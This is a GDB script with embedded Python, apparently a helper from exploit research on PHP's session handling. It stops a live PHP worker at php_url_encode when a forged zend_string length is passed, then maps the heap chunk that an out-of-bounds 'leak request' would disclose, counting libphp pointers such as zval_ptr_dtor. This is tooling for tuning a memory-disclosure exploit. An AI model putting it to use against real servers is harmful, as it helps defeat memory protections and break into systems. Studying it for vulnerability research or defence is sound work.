# b_tail_live.gdb - stop inside the leak request and look at the chunk the cookie is built from.
#
# b_tail_probe.gdb runs after the request, when PS(id) has already been reset. This one parks on
# php_session_send_cookie - the exact moment php_url_encode reads the forged zend_string - so the
# chunk, its free pages and its module-pointer content are the ones the disclosure sees.
#
#   sudo gdb -q -batch -p <worker> -x gdb/b_tail_live.gdb   # blocks until the leak request arrives
set pagination off
set confirm off
set width 0

# php_session_send_cookie is static (no symbol), but the encode it calls is exported and the forged
# length is the one argument we can recognise: stop right before the out-of-bounds read.
break php_url_encode if $x1 == 0xc8000
continue

python
import gdb

ZVAL_PTR_DTOR = 0x638120
PS_ID = 0x10
CHUNK = 0x200000
PAGE = 0x1000


def mem(addr, size):
    try:
        return gdb.selected_inferior().read_memory(addr, size).tobytes()
    except Exception:
        return None


def q(addr, size=8):
    raw = mem(addr, size)
    return None if raw is None else int.from_bytes(raw, "little")


def module_range(pid, needle="libphp"):
    lo = hi = 0
    try:
        with open("/proc/%d/maps" % pid) as fh:
            for line in fh:
                if needle not in line:
                    continue
                start, _, end = line.split()[0].partition("-")
                s, e = int(start, 16), int(end, 16)
                lo = s if not lo or s < lo else lo
                hi = max(hi, e)
    except OSError:
        pass
    return lo, hi


pid = gdb.selected_inferior().pid
lib, libend = module_range(pid)
try:
    psid = q(int(gdb.parse_and_eval("(unsigned long)&ps_globals")) + PS_ID) or 0
except Exception:
    psid = 0
base = psid & ~(CHUNK - 1) if psid else 0
print("[tl] libphp=%#x-%#x PS(id)=%#x chunk=%#x off=%#x"
      % (lib, libend, psid, base, psid - base if base else 0))
if base:
    print("[tl] free_pages=%d free_tail=%d" % (q(base + 0x18, 4) or 0, q(base + 0x1c, 4) or 0))
    hist = {}
    per_page = {}
    zdtor = 0
    counts = {}
    for page in range(1, 512):
        raw = mem(base + page * PAGE, PAGE)
        if raw is None:
            break
        for off in range(0, PAGE, 8):
            v = int.from_bytes(raw[off:off + 8], "little")
            if not v:
                continue
            counts[v] = counts.get(v, 0) + 1
            if lib and lib <= v < libend:
                per_page[page] = per_page.get(page, 0) + 1
                if v - lib == ZVAL_PTR_DTOR:
                    zdtor += 1
    print("[tl] module pointers: %d pages, %d total; zval_ptr_dtor=%d"
          % (len(per_page), sum(per_page.values()), zdtor))
    for page in sorted(per_page)[:12]:
        print("[tl]   page %#x: %d" % (page, per_page[page]))
    top = sorted(counts.items(), key=lambda kv: -kv[1])[:5]
    print("[tl] top qwords: " + ", ".join("%#x x%d" % (v, c) for v, c in top))
    for page in (0x191, 0x1a0, 0x1c0, 0x1e0, 0x1f0):
        raw = mem(base + page * PAGE, 64)
        if raw:
            print("[tl]   +%#x: %s" % (page * PAGE, raw[:32].hex()))
end
